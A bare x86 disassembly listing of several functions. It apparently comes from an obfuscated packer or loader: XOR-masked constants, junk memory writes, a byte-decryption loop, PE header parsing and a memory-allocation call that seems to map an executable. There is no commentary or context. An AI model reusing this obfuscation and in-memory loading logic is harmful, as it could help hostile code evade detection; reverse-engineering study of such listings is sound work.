  4288fb:	jne    0x428905
  4288fd:	xor    dl,0x7e
  428900:	add    dl,0x3
  428903:	jmp    0x42891b
  428905:	mov    eax,DWORD PTR [ebp-0x18]
  428908:	xor    al,0xae
  42890a:	mov    cl,0xb
  42890c:	sub    cl,al
  42890e:	add    dl,cl
  428910:	mov    ecx,DWORD PTR [ebp-0x1c]
  428913:	xor    cl,0xae
  428916:	sub    cl,0xb
  428919:	ror    dl,cl
  42891b:	xor    eax,eax
  42891d:	mov    eax,DWORD PTR [ebp+0x8]
  428920:	mov    ecx,DWORD PTR [ebp-0xc]
  428923:	mov    BYTE PTR [eax+ecx*1],dl
  428926:	mov    eax,DWORD PTR [ebp+0x8]
  428929:	mov    ecx,DWORD PTR [ebp-0x10]
  42892c:	sub    eax,edi
  42892e:	xor    eax,esi
  428930:	cmp    eax,ecx
  428932:	jne    0x428955
  428934:	mov    eax,DWORD PTR [ebp+0x10]
  428937:	mov    ecx,DWORD PTR [ebp+0xc]
  42893a:	xor    eax,esi
  42893c:	xor    ecx,esi
  42893e:	sub    eax,ecx
  428940:	mov    ecx,DWORD PTR [ebp-0x20]
  428943:	sub    eax,edi
  428945:	xor    eax,esi
  428947:	mov    DWORD PTR [ebp+0x10],eax
  42894a:	mov    eax,DWORD PTR [ebp+0xc]
  42894d:	xor    eax,esi
  42894f:	sub    ecx,eax
  428951:	sub    ecx,edi
  428953:	jmp    0x428964
  428955:	mov    eax,DWORD PTR [ebp+0xc]
  428958:	xor    eax,esi
  42895a:	mov    ecx,0xffcd8d0b
  42895f:	sub    ecx,eax
  428961:	add    ecx,DWORD PTR [ebp+0x8]
  428964:	mov    DWORD PTR [ebp+0x8],ecx
  428967:	mov    eax,DWORD PTR [ebp+0x10]
  42896a:	cmp    eax,ebx
  42896c:	jne    0x42886a
  428972:	mov    eax,DWORD PTR [ebp-0x24]
  428975:	jmp    0x42897a
  428977:	mov    eax,DWORD PTR [ebp-0x4]
  42897a:	xor    eax,esi
  42897c:	add    eax,edi
  42897e:	pop    edi
  42897f:	pop    esi
  428980:	pop    ebx
  428981:	leave  
  428982:	ret    0xc
  428985:	push   ebp
  428986:	mov    ebp,esp
  428988:	sub    esp,0x420
  42898e:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  428995:	mov    DWORD PTR [ebp-0xc],0xf89c85a2
  42899c:	mov    DWORD PTR [ebp-0x18],0xf89c86a5
  4289a3:	push   ebx
  4289a4:	mov    DWORD PTR [ebp-0x1c],0xf89c85a4
  4289ab:	mov    eax,DWORD PTR [ebp-0x14]
  4289ae:	push   esi
  4289af:	mov    esi,0x75108ae
  4289b4:	push   edi
  4289b5:	xor    eax,esi
  4289b7:	mov    edi,0x3272f5
  4289bc:	add    eax,edi
  4289be:	mov    DWORD PTR [ebp-0x8],eax
  4289c1:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  4289c8:	mov    DWORD PTR [ebp-0x4],0xead71885
  4289cf:	mov    DWORD PTR [ebp-0x10],0x8
  4289d6:	mov    ecx,ecx
  4289d8:	mov    eax,DWORD PTR [ebp-0xc]
  4289db:	mov    ecx,DWORD PTR [ebp-0x14]
  4289de:	xor    eax,esi
  4289e0:	xor    ecx,esi
  4289e2:	add    eax,edi
  4289e4:	add    ecx,edi
  4289e6:	imul   eax,ecx
  4289e9:	jmp    0x428a1c
  4289eb:	mov    eax,DWORD PTR [ebp-0x4]
  4289ee:	sub    eax,edi
  4289f0:	xor    eax,esi
  4289f2:	mov    DWORD PTR [ebp-0x8],eax
  4289f5:	lea    ebx,[ebp-0x8]
  4289f8:	call   0x42873d
  4289fd:	mov    DWORD PTR [ebp-0x8],eax
  428a00:	mov    eax,DWORD PTR [ebp-0x8]
  428a03:	mov    ecx,DWORD PTR [ebp-0x4]
  428a06:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  428a0d:	mov    eax,DWORD PTR [ebp-0xc]
  428a10:	mov    ecx,DWORD PTR [ebp-0x4]
  428a13:	xor    eax,esi
  428a15:	lea    eax,[eax+ecx*1+0x3272f5]
  428a1c:	mov    DWORD PTR [ebp-0x4],eax
  428a1f:	mov    eax,DWORD PTR [ebp-0x18]
  428a22:	mov    ecx,DWORD PTR [ebp-0xc]
  428a25:	xor    ecx,esi
  428a27:	xor    eax,esi
  428a29:	sub    eax,ecx
  428a2b:	mov    ecx,DWORD PTR [ebp-0x4]
  428a2e:	cmp    ecx,eax
  428a30:	jbe    0x4289eb
  428a32:	mov    eax,DWORD PTR [ebp-0x1c]
  428a35:	xor    eax,esi
  428a37:	add    eax,edi
  428a39:	mov    DWORD PTR [ebp-0x8],eax
  428a3c:	mov    DWORD PTR [ebp-0x18],0xf89c86a4
  428a43:	mov    ebx,ebx
  428a45:	jmp    0x428aa8
  428a47:	mov    ecx,DWORD PTR [ebp-0x20]
  428a4a:	mov    eax,DWORD PTR [ebp-0x8]
  428a4d:	xor    ecx,esi
  428a4f:	add    ecx,edi
  428a51:	shr    eax,cl
  428a53:	mov    DWORD PTR [ebp-0x4],eax
  428a56:	mov    eax,DWORD PTR [ebp+0x8]
  428a59:	mov    cl,BYTE PTR [eax]
  428a5b:	mov    BYTE PTR [ebp+0xb],cl
  428a5e:	mov    cl,BYTE PTR [ebp+0xb]
  428a61:	mov    edx,DWORD PTR [ebp-0x8]
  428a64:	movzx  ecx,cl
  428a67:	xor    ecx,edx
  428a69:	mov    DWORD PTR [ebp+0x8],ecx
  428a6c:	mov    ecx,DWORD PTR [ebp-0x18]
  428a6f:	mov    edx,DWORD PTR [ebp+0x8]
  428a72:	xor    ecx,esi
  428a74:	add    ecx,edi
  428a76:	and    ecx,edx
  428a78:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  428a7f:	mov    edx,DWORD PTR [ebp-0x4]
  428a82:	xor    ecx,edx
  428a84:	mov    DWORD PTR [ebp-0x8],ecx
  428a87:	mov    ecx,DWORD PTR [ebp-0xc]
  428a8a:	xor    ecx,esi
  428a8c:	lea    eax,[eax+ecx*1+0x3272f5]
  428a93:	mov    DWORD PTR [ebp+0x8],eax
  428a96:	mov    eax,DWORD PTR [ebp-0xc]
  428a99:	xor    eax,esi
  428a9b:	mov    ecx,0xffcd8d0b
  428aa0:	sub    ecx,eax
  428aa2:	add    ecx,DWORD PTR [ebp-0x10]
  428aa5:	mov    DWORD PTR [ebp-0x10],ecx
  428aa8:	mov    eax,DWORD PTR [ebp-0x14]
  428aab:	mov    ecx,DWORD PTR [ebp-0x10]
  428aae:	xor    eax,esi
  428ab0:	add    eax,edi
  428ab2:	cmp    ecx,eax
  428ab4:	jne    0x428a47
  428ab6:	mov    eax,DWORD PTR [ebp-0x1c]
  428ab9:	mov    ecx,DWORD PTR [ebp-0x8]
  428abc:	xor    eax,esi
  428abe:	add    eax,edi
  428ac0:	pop    edi
  428ac1:	pop    esi
  428ac2:	xor    eax,ecx
  428ac4:	pop    ebx
  428ac5:	leave  
  428ac6:	ret    0x4
  428ac9:	push   ebp
  428aca:	mov    ebp,esp
  428acc:	mov    eax,DWORD PTR [ebp+0x1c]
  428acf:	mov    ecx,DWORD PTR [ebp+0x8]
  428ad2:	mov    edx,DWORD PTR [ebp+0x10]
  428ad5:	mov    eax,DWORD PTR [eax+0x190]
  428adb:	mov    eax,DWORD PTR [eax]
  428add:	sub    esp,0x64
  428ae0:	push   ebx
  428ae1:	push   esi
  428ae2:	push   edi
  428ae3:	mov    edi,0x75108ae
  428ae8:	xor    ecx,edi
  428aea:	mov    ebx,0x3272f5
  428aef:	add    ecx,ebx
  428af1:	cmp    ecx,edx
  428af3:	jne    0x428b04
  428af5:	or     DWORD PTR ds:0x3750c3f,0x4263eb2c
  428aff:	jmp    0x429000
  428b04:	mov    ecx,DWORD PTR [ebp+0x8]
  428b07:	mov    esi,DWORD PTR [ebp+0x14]
  428b0a:	mov    edx,DWORD PTR [esi]
  428b0c:	xor    ecx,edi
  428b0e:	add    ecx,ebx
  428b10:	cmp    edx,ecx
  428b12:	je     0x428fbb
  428b18:	mov    ecx,DWORD PTR [ebp+0x1c]
  428b1b:	mov    DWORD PTR [ebp-0x1c],eax
  428b1e:	mov    DWORD PTR [ebp+0x1c],ecx
  428b21:	mov    ecx,DWORD PTR [ebp+0x18]
  428b24:	mov    eax,DWORD PTR [esi]
  428b26:	mov    DWORD PTR [ebp-0x20],eax
  428b29:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  428b30:	mov    edx,0xf89c85a2
  428b35:	mov    DWORD PTR [ebp-0x8],edx
  428b38:	mov    eax,DWORD PTR [ebp+0x1c]
  428b3b:	mov    DWORD PTR [ebp+0x1c],eax
  428b3e:	mov    eax,DWORD PTR [ebp+0x1c]
  428b41:	mov    eax,DWORD PTR [eax+0x190]
  428b47:	mov    eax,DWORD PTR [eax]
  428b49:	mov    DWORD PTR [ebp-0x24],ecx
  428b4c:	mov    ecx,DWORD PTR [ebp+0x1c]
  428b4f:	mov    ecx,DWORD PTR [ecx+0x190]
  428b55:	mov    ecx,DWORD PTR [ecx]
  428b57:	add    ecx,DWORD PTR [eax+0x3c]
  428b5a:	mov    DWORD PTR [ebp+0x10],ecx
  428b5d:	mov    eax,DWORD PTR [ebp+0x8]
  428b60:	xor    eax,edi
  428b62:	add    eax,ebx
  428b64:	mov    DWORD PTR [ebp-0x4],eax
  428b67:	mov    eax,DWORD PTR [ebp+0x8]
  428b6a:	xor    eax,edi
  428b6c:	add    eax,ebx
  428b6e:	mov    DWORD PTR [ebp+0x18],eax
  428b71:	mov    eax,DWORD PTR [ebp+0x10]
  428b74:	mov    eax,DWORD PTR [eax+0x50]
  428b77:	sub    eax,0xc
  428b7a:	mov    DWORD PTR [ebp-0x28],eax
  428b7d:	mov    eax,DWORD PTR [ebp+0x10]
  428b80:	mov    eax,DWORD PTR [eax+0x38]
  428b83:	mov    ecx,DWORD PTR [ebp+0x10]
  428b86:	dec    eax
  428b87:	test   DWORD PTR [ecx+0x54],eax
  428b8a:	mov    eax,DWORD PTR [ebp+0x10]
  428b8d:	je     0x428ba7
  428b8f:	mov    eax,DWORD PTR [eax+0x38]
  428b92:	mov    ecx,DWORD PTR [ebp+0x10]
  428b95:	mov    ecx,DWORD PTR [ecx+0x54]
  428b98:	dec    eax
  428b99:	not    eax
  428b9b:	and    ecx,eax
  428b9d:	mov    eax,DWORD PTR [ebp+0x10]
  428ba0:	mov    eax,DWORD PTR [eax+0x38]
  428ba3:	add    eax,ecx
  428ba5:	jmp    0x428baa
  428ba7:	mov    eax,DWORD PTR [eax+0x54]
  428baa:	mov    DWORD PTR [ebp+0x1c],eax
  428bad:	mov    eax,DWORD PTR [ebp+0x8]
  428bb0:	xor    eax,edi
  428bb2:	add    eax,ebx
  428bb4:	mov    DWORD PTR [ebp+0x18],eax
  428bb7:	mov    eax,DWORD PTR [ebp+0x8]
  428bba:	xor    eax,edi
  428bbc:	add    eax,ebx
  428bbe:	mov    DWORD PTR [ebp+0x18],eax
  428bc1:	mov    eax,DWORD PTR [ebp+0x8]
  428bc4:	mov    ecx,DWORD PTR [ebp-0x24]
  428bc7:	xor    eax,edi
  428bc9:	add    eax,ebx
  428bcb:	mov    DWORD PTR [ecx],eax
  428bcd:	mov    DWORD PTR [ebp+0x18],edx
  428bd0:	mov    DWORD PTR [ebp+0x18],0xf89c85a3
  428bd7:	mov    DWORD PTR [ebp+0x18],0xf89c85a0
  428bde:	mov    DWORD PTR [ebp+0x18],0xf89c85a1
  428be5:	mov    eax,DWORD PTR [ebp-0x8]
  428be8:	mov    ecx,DWORD PTR [ebp+0x1c]
  428beb:	xor    eax,edi
  428bed:	add    eax,ebx
  428bef:	imul   eax,ecx
  428bf2:	mov    ecx,DWORD PTR [ebp+0x8]
  428bf5:	mov    edx,DWORD PTR [ebp-0x28]
  428bf8:	xor    ecx,edi
  428bfa:	lea    ecx,[ecx+edx*1+0x3272f5]
  428c01:	cmp    eax,ecx
  428c03:	jae    0x428fb4
  428c09:	mov    eax,DWORD PTR [ebp+0x8]
  428c0c:	xor    eax,edi
  428c0e:	add    eax,ebx
  428c10:	mov    DWORD PTR [ebp+0x18],eax
  428c13:	mov    eax,DWORD PTR [ebp+0x1c]
  428c16:	add    eax,DWORD PTR [ebp-0x1c]
  428c19:	mov    DWORD PTR [ebp-0x4],eax
  428c1c:	push   DWORD PTR [ebp-0x4]
  428c1f:	mov    esi,DWORD PTR [ebp-0x1c]
  428c22:	mov    ecx,DWORD PTR [ebp+0x10]
  428c25:	call   0x427d75
  428c2a:	mov    DWORD PTR [ebp+0xc],eax
  428c2d:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  428c34:	mov    eax,DWORD PTR [ebp-0x18]
  428c37:	xor    eax,edi
  428c39:	lea    ecx,[ebp-0x40]
  428c3c:	add    eax,ebx
  428c3e:	push   ecx
  428c3f:	call   0x428309
  428c44:	mov    eax,DWORD PTR [ebp+0xc]
  428c47:	test   eax,eax
  428c49:	je     0x428c99
  428c4b:	mov    eax,DWORD PTR [ebp-0x18]
  428c4e:	xor    eax,edi
  428c50:	add    eax,ebx
  428c52:	push   eax
  428c53:	push   DWORD PTR [ebp+0xc]
  428c56:	lea    eax,[ebp-0x40]
  428c59:	push   eax
  428c5a:	call   0x4281ff
  428c5f:	mov    eax,DWORD PTR [ebp-0x4]
  428c62:	mov    DWORD PTR [ebp-0x18],eax
  428c65:	mov    eax,DWORD PTR [ebp-0x18]
  428c68:	mov    ecx,DWORD PTR [ebp-0x1c]
  428c6b:	sub    eax,ecx
  428c6d:	mov    DWORD PTR [ebp-0x18],eax
  428c70:	mov    eax,DWORD PTR [ebp+0xc]
  428c73:	mov    ecx,DWORD PTR [ebp+0xc]
  428c76:	mov    eax,DWORD PTR [eax+0x10]
  428c79:	add    eax,DWORD PTR [ecx+0xc]
  428c7c:	mov    ecx,DWORD PTR [ebp-0x18]
  428c7f:	cmp    ecx,eax
  428c81:	jb     0x428c99
  428c83:	mov    eax,DWORD PTR [ebp+0xc]
  428c86:	mov    eax,DWORD PTR [eax+0xc]
  428c89:	mov    ecx,DWORD PTR [ebp+0xc]
  428c8c:	add    eax,DWORD PTR [ecx+0x8]
  428c8f:	mov    ecx,DWORD PTR [ebp-0x18]
  428c92:	sub    eax,ecx
  428c94:	jmp    0x428f87
  428c99:	push   0xc
  428c9b:	push   DWORD PTR [ebp-0x4]
  428c9e:	lea    eax,[ebp-0x4c]
  428ca1:	push   eax
  428ca2:	call   0x4281ff
  428ca7:	mov    eax,0xf89c85a5
  428cac:	mov    DWORD PTR [ebp-0x2c],eax
  428caf:	mov    DWORD PTR [ebp-0x30],0xf89c85a2
  428cb6:	mov    DWORD PTR [ebp-0x34],0xf89c85a3
  428cbd:	mov    DWORD PTR [ebp-0x38],0xf89c85a0
  428cc4:	lea    ecx,[ebp-0x2c]
  428cc7:	mov    DWORD PTR [ebp-0xc],ecx
  428cca:	lea    ecx,[ebp-0x30]
  428ccd:	mov    DWORD PTR [ebp-0x10],ecx
  428cd0:	lea    ecx,[ebp-0x34]
  428cd3:	mov    DWORD PTR [ebp+0xc],ecx
  428cd6:	lea    ecx,[ebp-0x38]
  428cd9:	mov    DWORD PTR [ebp-0x14],ecx
  428cdc:	mov    ecx,DWORD PTR [ebp+0x8]
  428cdf:	xor    ecx,edi
  428ce1:	add    ecx,ebx
  428ce3:	mov    DWORD PTR [ebp-0x18],ecx
  428ce6:	jmp    0x428ee2
  428ceb:	cmp    eax,0xf89c85a3
  428cf0:	je     0x428ef4
  428cf6:	mov    ecx,DWORD PTR [ebp-0x8]
  428cf9:	xor    ecx,edi
  428cfb:	mov    esi,eax
  428cfd:	add    ecx,ebx
  428cff:	mov    DWORD PTR [ebp+0x18],ecx
  428d02:	mov    eax,DWORD PTR [ebp-0x18]
  428d05:	xor    esi,edi
  428d07:	lea    eax,[eax+esi*1+0x3272f5]
  428d0e:	mov    DWORD PTR [ebp-0x18],eax
  428d11:	mov    eax,DWORD PTR [ebp-0x8]
  428d14:	mov    ecx,DWORD PTR [ebp-0x18]
  428d17:	xor    eax,edi
  428d19:	add    eax,ebx
  428d1b:	cmp    ecx,eax
  428d1d:	jne    0x428d32
  428d1f:	mov    eax,DWORD PTR [ebp+0x8]
  428d22:	xor    eax,edi
  428d24:	add    eax,ebx
  428d26:	push   eax
  428d27:	push   0xc
  428d29:	lea    eax,[ebp-0x4c]
  428d2c:	push   eax
  428d2d:	call   0x4287e5
  428d32:	mov    eax,DWORD PTR [ebp-0xc]
  428d35:	mov    eax,DWORD PTR [eax]
  428d37:	xor    eax,edi
  428d39:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428d40:	mov    ecx,DWORD PTR [ebp+0x8]
  428d43:	xor    ecx,edi
  428d45:	movzx  eax,al
  428d48:	add    ecx,ebx
  428d4a:	cmp    eax,ecx
  428d4c:	je     0x428eca
  428d52:	mov    eax,DWORD PTR [ebp-0x10]
  428d55:	mov    eax,DWORD PTR [eax]
  428d57:	xor    eax,edi
  428d59:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428d60:	mov    ecx,DWORD PTR [ebp+0x8]
  428d63:	xor    ecx,edi
  428d65:	movzx  eax,al
  428d68:	add    ecx,ebx
  428d6a:	cmp    eax,ecx
  428d6c:	je     0x428eca
  428d72:	mov    eax,DWORD PTR [ebp+0xc]
  428d75:	mov    eax,DWORD PTR [eax]
  428d77:	xor    eax,edi
  428d79:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428d80:	mov    ecx,DWORD PTR [ebp+0x8]
  428d83:	xor    ecx,edi
  428d85:	movzx  eax,al
  428d88:	add    ecx,ebx
  428d8a:	cmp    eax,ecx
  428d8c:	je     0x428eca
  428d92:	mov    eax,DWORD PTR [ebp-0x14]
  428d95:	mov    eax,DWORD PTR [eax]
  428d97:	xor    eax,edi
  428d99:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428da0:	mov    ecx,DWORD PTR [ebp+0x8]
  428da3:	xor    ecx,edi
  428da5:	movzx  eax,al
  428da8:	add    ecx,ebx
  428daa:	cmp    eax,ecx
  428dac:	je     0x428eca
  428db2:	mov    eax,DWORD PTR [ebp-0x10]
  428db5:	mov    eax,DWORD PTR [eax]
  428db7:	xor    eax,edi
  428db9:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428dc0:	mov    ecx,DWORD PTR [ebp-0xc]
  428dc3:	mov    ecx,DWORD PTR [ecx]
  428dc5:	xor    ecx,edi
  428dc7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428dce:	xor    al,cl
  428dd0:	mov    ecx,DWORD PTR [ebp+0xc]
  428dd3:	mov    ecx,DWORD PTR [ecx]
  428dd5:	xor    ecx,edi
  428dd7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428dde:	or     al,cl
  428de0:	mov    ecx,DWORD PTR [ebp-0xc]
  428de3:	mov    ecx,DWORD PTR [ecx]
  428de5:	xor    ecx,edi
  428de7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ad]
  428dee:	cmp    cl,al
  428df0:	jne    0x428eca
  428df6:	mov    eax,DWORD PTR [ebp+0xc]
  428df9:	mov    eax,DWORD PTR [eax]
  428dfb:	xor    eax,edi
  428dfd:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428e04:	mov    ecx,DWORD PTR [ebp-0x10]
  428e07:	mov    ecx,DWORD PTR [ecx]
  428e09:	xor    ecx,edi
  428e0b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428e12:	xor    al,cl
  428e14:	mov    ecx,DWORD PTR [ebp-0x14]
  428e17:	mov    ecx,DWORD PTR [ecx]
  428e19:	xor    ecx,edi
  428e1b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428e22:	or     al,cl
  428e24:	mov    ecx,DWORD PTR [ebp-0x10]
  428e27:	mov    ecx,DWORD PTR [ecx]
  428e29:	xor    ecx,edi
  428e2b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ad]
  428e32:	cmp    cl,al
  428e34:	jne    0x428eca
  428e3a:	mov    eax,DWORD PTR [ebp-0x14]
  428e3d:	mov    eax,DWORD PTR [eax]
  428e3f:	xor    eax,edi
  428e41:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428e48:	mov    ecx,DWORD PTR [ebp+0xc]
  428e4b:	mov    ecx,DWORD PTR [ecx]
  428e4d:	xor    ecx,edi
  428e4f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428e56:	xor    al,cl
  428e58:	mov    ecx,DWORD PTR [ebp-0xc]
  428e5b:	mov    ecx,DWORD PTR [ecx]
  428e5d:	xor    ecx,edi
  428e5f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428e66:	or     al,cl
  428e68:	mov    ecx,DWORD PTR [ebp+0xc]
  428e6b:	mov    ecx,DWORD PTR [ecx]
  428e6d:	xor    ecx,edi
  428e6f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ad]
  428e76:	cmp    cl,al
  428e78:	jne    0x428eca
  428e7a:	mov    eax,DWORD PTR [ebp-0x14]
  428e7d:	mov    eax,DWORD PTR [eax]
  428e7f:	xor    eax,edi
  428e81:	mov    al,BYTE PTR [ebp+eax*1+0x3272a9]
  428e88:	mov    ecx,DWORD PTR [ebp-0xc]
  428e8b:	mov    ecx,DWORD PTR [ecx]
  428e8d:	xor    ecx,edi
  428e8f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428e96:	xor    al,cl
  428e98:	mov    ecx,DWORD PTR [ebp-0x10]
  428e9b:	mov    ecx,DWORD PTR [ecx]
  428e9d:	xor    ecx,edi
  428e9f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428ea6:	or     al,cl
  428ea8:	mov    ecx,DWORD PTR [ebp-0x14]
  428eab:	mov    ecx,DWORD PTR [ecx]
  428ead:	xor    ecx,edi
  428eaf:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ad]
  428eb6:	cmp    cl,al
  428eb8:	jne    0x428eca
  428eba:	lea    eax,[ebp-0x4c]
  428ebd:	push   eax
  428ebe:	call   0x428985
  428ec3:	mov    ecx,DWORD PTR [ebp-0x44]
  428ec6:	cmp    eax,ecx
  428ec8:	je     0x428ed4
  428eca:	mov    eax,DWORD PTR [ebp+0x8]
  428ecd:	xor    eax,edi
  428ecf:	add    eax,ebx
  428ed1:	mov    DWORD PTR [ebp+0x18],eax
  428ed4:	mov    eax,DWORD PTR [ebp-0x8]
  428ed7:	xor    eax,edi
  428ed9:	lea    eax,[eax+esi*1+0x3272f5]
  428ee0:	xor    eax,edi
  428ee2:	mov    ecx,DWORD PTR [ebp+0x8]
  428ee5:	mov    edx,DWORD PTR [ebp+0x18]
  428ee8:	xor    ecx,edi
  428eea:	add    ecx,ebx
  428eec:	cmp    edx,ecx
  428eee:	je     0x428ceb
  428ef4:	mov    eax,DWORD PTR [ebp+0x8]
  428ef7:	mov    ecx,DWORD PTR [ebp+0x18]
  428efa:	xor    eax,edi
  428efc:	add    eax,ebx
  428efe:	cmp    ecx,eax
  428f00:	jne    0x428f13
  428f02:	mov    eax,DWORD PTR [ebp-0x8]
  428f05:	mov    ecx,DWORD PTR [ebp+0x1c]
  428f08:	xor    eax,edi
  428f0a:	lea    eax,[eax+ecx*1+0x3272f5]
  428f11:	jmp    0x428f8a
  428f13:	push   0x18
  428f15:	push   DWORD PTR [ebp-0x4]
  428f18:	lea    eax,[ebp-0x64]
  428f1b:	push   eax
  428f1c:	call   0x4281ff
  428f21:	mov    eax,DWORD PTR [ebp+0x8]
  428f24:	mov    ecx,DWORD PTR [ebp-0x18]
  428f27:	xor    eax,edi
  428f29:	add    eax,ebx
  428f2b:	cmp    eax,ecx
  428f2d:	je     0x428f42
  428f2f:	mov    eax,DWORD PTR [ebp+0x8]
  428f32:	xor    eax,edi
  428f34:	add    eax,ebx
  428f36:	push   eax
  428f37:	push   0x18
  428f39:	lea    eax,[ebp-0x64]
  428f3c:	push   eax
  428f3d:	call   0x4287e5
  428f42:	mov    eax,DWORD PTR [ebp-0x4]
  428f45:	add    eax,0x18
  428f48:	mov    DWORD PTR [ebp+0x18],eax
  428f4b:	push   DWORD PTR [ebp-0x50]
  428f4e:	push   DWORD PTR [ebp+0x18]
  428f51:	mov    eax,DWORD PTR [ebp-0x54]
  428f54:	add    eax,DWORD PTR [ebp-0x20]
  428f57:	push   eax
  428f58:	call   0x4281ff
  428f5d:	mov    eax,DWORD PTR [ebp+0x8]
  428f60:	mov    ecx,DWORD PTR [ebp-0x18]
  428f63:	xor    eax,edi
  428f65:	add    eax,ebx
  428f67:	cmp    eax,ecx
  428f69:	je     0x428f7c
  428f6b:	push   0x0
  428f6d:	push   DWORD PTR [ebp-0x50]
  428f70:	mov    eax,DWORD PTR [ebp-0x54]
  428f73:	add    eax,DWORD PTR [ebp-0x20]
  428f76:	push   eax
  428f77:	call   0x4287e5
  428f7c:	mov    eax,DWORD PTR [ebp-0x24]
  428f7f:	mov    ecx,DWORD PTR [ebp-0x50]
  428f82:	add    DWORD PTR [eax],ecx
  428f84:	mov    eax,DWORD PTR [ebp-0x50]
  428f87:	add    eax,DWORD PTR [ebp+0x1c]
  428f8a:	mov    DWORD PTR [ebp+0x1c],eax
  428f8d:	mov    eax,DWORD PTR [ebp-0x8]
  428f90:	mov    ecx,DWORD PTR [ebp+0x1c]
  428f93:	xor    eax,edi
  428f95:	add    eax,ebx
  428f97:	imul   eax,ecx
  428f9a:	mov    ecx,DWORD PTR [ebp+0x8]
  428f9d:	mov    edx,DWORD PTR [ebp-0x28]
  428fa0:	xor    ecx,edi
  428fa2:	lea    ecx,[ecx+edx*1+0x3272f5]
  428fa9:	cmp    eax,ecx
  428fab:	jb     0x428c09
  428fb1:	mov    esi,DWORD PTR [ebp+0x14]
  428fb4:	mov    eax,DWORD PTR [ebp-0x20]
  428fb7:	mov    DWORD PTR [esi],eax
  428fb9:	jmp    0x429000
  428fbb:	mov    ecx,DWORD PTR [ebp+0x8]
  428fbe:	mov    edx,DWORD PTR [ebp+0xc]
  428fc1:	xor    ecx,edi
  428fc3:	xor    edx,edi
  428fc5:	add    ecx,ebx
  428fc7:	add    edx,ebx
  428fc9:	cmp    ecx,edx
  428fcb:	jne    0x428fdf
  428fcd:	mov    eax,ds:0x7f642ddc
  428fd2:	imul   eax,eax,0x9f15fccf
  428fd8:	mov    ds:0x7f642ddc,eax
  428fdd:	jmp    0x429000
  428fdf:	mov    ecx,DWORD PTR [ebp+0x8]
  428fe2:	xor    ecx,edi
  428fe4:	add    ecx,ebx
  428fe6:	cmp    eax,ecx
  428fe8:	je     0x428ff6
  428fea:	sub    DWORD PTR ds:0xf861e3c,0x709beac4
  428ff4:	jmp    0x429000
  428ff6:	and    DWORD PTR ds:0x3343fadc,0x5265ec3f
  429000:	pop    edi
  429001:	pop    esi
  429002:	pop    ebx
  429003:	leave  
  429004:	ret    0x18
  429007:	push   ebp
  429008:	mov    ebp,esp
  42900a:	and    esp,0xfffffff8
  42900d:	mov    eax,DWORD PTR [ebp+0x20]
  429010:	sub    esp,0x14
  429013:	push   ebx
  429014:	mov    ebx,DWORD PTR [ebp+0x14]
  429017:	push   esi
  429018:	push   edi
  429019:	cmp    eax,0xf89c85a5
  42901e:	jne    0x42902a
  429020:	push   0xf89c85a2
  429025:	jmp    0x42915c
  42902a:	mov    eax,DWORD PTR [ebp+0x20]
  42902d:	cmp    eax,0xf89c85a2
  429032:	jne    0x42903e
  429034:	push   0xf89c85a3
  429039:	jmp    0x42915c
  42903e:	mov    eax,DWORD PTR [ebp+0x20]
  429041:	cmp    eax,0xf89c85a3
  429046:	jne    0x429052
  429048:	push   0xf89c85a0
  42904d:	jmp    0x42915c
  429052:	mov    eax,DWORD PTR [ebp+0x20]
  429055:	cmp    eax,0xf89c85a0
  42905a:	jne    0x429066
  42905c:	push   0xf89c85a1
  429061:	jmp    0x42915c
  429066:	mov    ecx,DWORD PTR [ebp+0x20]
  429069:	mov    eax,0xf89c85bc
  42906e:	cmp    ecx,eax
  429070:	jne    0x42912c
  429076:	mov    eax,DWORD PTR [ebp+0x10]
  429079:	mov    DWORD PTR [esp+0xc],eax
  42907d:	mov    eax,DWORD PTR [ebp+0x18]
  429080:	mov    DWORD PTR [esp+0x14],eax
  429084:	mov    eax,DWORD PTR [ebp+0xc]
  429087:	mov    DWORD PTR [esp+0x18],eax
  42908b:	mov    eax,DWORD PTR [ebp+0x8]
  42908e:	mov    DWORD PTR [esp+0x10],eax
  429092:	mov    eax,DWORD PTR [esp+0x10]
  429096:	mov    ecx,DWORD PTR [esp+0x14]
  42909a:	mov    edi,0x75108ae
  42909f:	xor    eax,edi
  4290a1:	mov    esi,0x3272f5
  4290a6:	add    eax,esi
  4290a8:	mov    DWORD PTR [ecx],eax
  4290aa:	mov    eax,DWORD PTR [esp+0xc]
  4290ae:	mov    eax,DWORD PTR [eax+0x194]
  4290b4:	mov    ecx,DWORD PTR [eax]
  4290b6:	mov    eax,DWORD PTR [esp+0xc]
  4290ba:	mov    eax,DWORD PTR [eax+0x194]
  4290c0:	mov    eax,DWORD PTR [eax]
  4290c2:	add    eax,DWORD PTR [ecx+0x3c]
  4290c5:	mov    ecx,DWORD PTR [esp+0xc]
  4290c9:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4290cf:	mov    ecx,DWORD PTR [ecx+0x14]
  4290d2:	push   0x4
  4290d4:	push   0x3000
  4290d9:	push   DWORD PTR [eax+0x50]
  4290dc:	push   0x0
  4290de:	call   ecx
  4290e0:	mov    DWORD PTR [ebx],eax
  4290e2:	mov    eax,DWORD PTR [esp+0x10]
